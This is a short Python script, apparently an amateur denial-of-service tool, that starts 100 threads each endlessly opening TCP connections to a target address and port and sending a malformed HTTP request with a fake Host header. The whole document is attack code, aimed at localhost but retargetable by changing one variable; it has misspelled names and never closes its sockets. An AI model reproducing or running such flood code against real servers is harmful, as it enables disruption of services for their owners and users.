import socket
import threading

port = 8080
tergat = "127.0.0.1"
face_ip = "182.21.40.65"

alrody_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((tergat, port))

        s.sendto(("GET /"+tergat+"HTTP/1.1\r\n").encode("ascii"),(tergat, port))
        s.sendto(("HOST: "+face_ip+"\r\n\r\n").encode("ascii"), (tergat, port))

        global alrody_connected
        alrody_connected +=1
        if alrody_connected %100==0:
            print(alrody_connected)


for i in range(100):
    trade = threading.Thread(target=attack)
    trade.start()




